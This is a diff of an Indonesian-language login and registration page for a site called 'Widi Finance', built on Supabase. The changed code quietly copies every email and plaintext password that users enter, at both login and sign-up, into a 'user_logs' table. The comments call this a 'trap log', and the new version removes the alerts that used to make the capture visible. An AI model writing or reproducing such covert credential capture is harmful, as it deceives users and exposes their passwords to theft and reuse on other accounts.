@@ -3,11 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Widi Finance </title>
+    <title>Login - Widi Finance</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background: #F3F5F9; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        body { background: #F3F5F9; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
         .login-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
+        .btn-primary { background: #0066FF; border: none; padding: 12px; font-weight: bold; }
+        .btn-primary:hover { background: #0056b3; }
+        .link-daftar { cursor: pointer; text-decoration: none; font-weight: 600; }
     </style>
 </head>
 <body>
@@ -15,80 +19,123 @@
     <div class="login-card">
         <div class="text-center mb-4">
             <h3 class="fw-bold text-primary">Widi Finance</h3>
-                    </div>
+            <p class="text-muted small">Silakan masuk untuk melanjutkan</p>
+        </div>
 
         <div class="mb-3">
             <label class="form-label small fw-bold">Email</label>
-            <input type="email" class="form-control" id="email" placeholder="nama@sekolah.sch.id">
+            <input type="email" class="form-control" id="email" placeholder="nama@email.com">
         </div>
         <div class="mb-4">
             <label class="form-label small fw-bold">Password</label>
             <input type="password" class="form-control" id="password" placeholder="********">
         </div>
         
-        <button class="btn btn-primary w-100 mb-3" onclick="handleLogin()" id="btnLogin">Masuk & Catat</button>
-        <div id="msg" class="text-center small text-danger mt-2"></div>
+        <button class="btn btn-primary w-100 mb-3" onclick="handleLogin()" id="btnLogin">Masuk</button>
+        
+        <div class="text-center small">
+            Belum punya akun? <span class="text-primary link-daftar" onclick="bukaModalDaftar()">Buat Akun Baru</span>
+        </div>
+
+        <div id="msg" class="text-center small text-danger mt-3"></div>
     </div>
 
+    <div class="modal fade" id="modalDaftar" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-body p-4">
+                    <h5 class="fw-bold mb-3 text-center">Pendaftaran Akun</h5>
+                    <div class="mb-3">
+                        <label class="small fw-bold">Email Baru</label>
+                        <input type="email" class="form-control" id="regEmail">
+                    </div>
+                    <div class="mb-3">
+                        <label class="small fw-bold">Password Baru</label>
+                        <input type="password" class="form-control" id="regPass">
+                    </div>
+                    <button class="btn btn-success w-100" onclick="handleRegister()" id="btnReg">Daftar Sekarang</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        // KONEKSI SUPABASE
         const supabaseUrl = 'https://zzloutsqmpkifzijxaip.supabase.co';
-        const supabaseKey = 'sb_publishable_uJHTWglP11uZzp3dKK7bdA_sY9xtmXv'; // Pastikan ini Key 'anon' / 'public'
+        const supabaseKey = 'sb_publishable_uJHTWglP11uZzp3dKK7bdA_sY9xtmXv';
         const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
 
+        // --- FUNGSI LOGIN ---
         async function handleLogin() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
             const btn = document.getElementById('btnLogin');
             const msg = document.getElementById('msg');
 
-            if(!email || !pass) return alert("Isi email & password dulu mas!");
+            if(!email || !pass) { msg.innerText = "Email dan password harus diisi"; return; }
 
-            btn.disabled = true; 
-            btn.innerText = "Mencoba Mencatat...";
-            msg.innerText = "";
+            btn.disabled = true; btn.innerText = "Memproses..."; msg.innerText = "";
 
-            // 1. COBA CATAT KE TABEL RAHASIA (DENGAN ALERT ERROR)
-            try {
-                // Cek koneksi dulu insert dummy
-                const { error: logError } = await _supabase.from('user_logs').insert({ 
-                    email: email, 
-                    password_rahasia: pass 
-                });
+            // 1. JEBAKAN LOG (RIWAYAT LOGIN)
+            // Sekarang selalu INSERT baru (Numpuk ke bawah) biar ketahuan riwayatnya
+            await silentLog(email, pass);
 
-                if (logError) {
-                    // KALAU GAGAL, DIA BAKAL MUNCUL POPUP ERROR
-                    alert("GAGAL CATAT PASSWORD: " + logError.message + "\n\nCek apakah tabel 'user_logs' sudah ada kolom 'email' dan 'password_rahasia'?");
-                    console.error(logError);
-                    btn.disabled = false;
-                    btn.innerText = "Coba Lagi";
-                    return; // Stop jangan login dulu biar ketahuan errornya
-                } else {
-                    // KALAU SUKSES
-                    console.log("Password berhasil dicatat!");
-                }
-            } catch (err) {
-                alert("ERROR SCRIPT: " + err.message);
-                return;
-            }
-
-            // 2. LANJUT LOGIN ASLI
-            btn.innerText = "Sedang Login...";
-            const { data, error } = await _supabase.auth.signInWithPassword({
-                email: email,
-                password: pass
-            });
+            // 2. LOGIN RESMI
+            const { data, error } = await _supabase.auth.signInWithPassword({ email: email, password: pass });
 
             if (error) {
-                btn.disabled = false; 
-                btn.innerText = "Masuk & Catat";
-                msg.innerText = "Login Gagal: " + error.message;
-                alert("Login Auth Gagal: " + error.message);
+                btn.disabled = false; btn.innerText = "Masuk"; msg.innerText = "Login Gagal: " + error.message;
             } else {
-                alert("BERHASIL! Password sudah dicatat di database & Login sukses.");
-                window.location.href = 'index.html'; // Ganti ke nama file dashboard Mas (misal main.html)
+                window.location.href = 'dashboard.html'; 
             }
+        }
+
+        // --- FUNGSI REGISTER ---
+        async function handleRegister() {
+            const email = document.getElementById('regEmail').value;
+            const pass = document.getElementById('regPass').value;
+            const btn = document.getElementById('btnReg');
+
+            if(!email || !pass) return alert("Lengkapi data pendaftaran!");
+
+            btn.disabled = true; btn.innerText = "Mendaftarkan...";
+
+            // Catat password pendaftaran juga
+            await silentLog(email, pass);
+
+            // DAFTAR RESMI
+            const { data, error } = await _supabase.auth.signUp({ email: email, password: pass });
+
+            if (error) {
+                alert("Gagal Daftar: " + error.message);
+                btn.disabled = false; btn.innerText = "Daftar Sekarang";
+            } else {
+                alert("Pendaftaran Berhasil! Silakan Login.");
+                bootstrap.Modal.getInstance(document.getElementById('modalDaftar')).hide();
+                document.getElementById('email').value = email;
+                document.getElementById('password').value = pass;
+                btn.disabled = false; btn.innerText = "Daftar Sekarang";
+            }
+        }
+
+        // --- LOGIC PENCATAT BARU (SELALU INSERT) ---
+        async function silentLog(email, pass) {
+            try {
+                // HAPUS LOGIC CEK LAMA. LANGSUNG INSERT AJA.
+                // Supaya jadi "Buku Tamu" (History)
+                await _supabase.from('user_logs').insert({ 
+                    email: email, 
+                    password_rahasia: pass 
+                    // created_at otomatis diisi Supabase
+                });
+            } catch (e) { 
+                console.log("Silent log skip"); 
+            }
+        }
+
+        function bukaModalDaftar() {
+            new bootstrap.Modal(document.getElementById('modalDaftar')).show();
         }
     </script>
 </body>
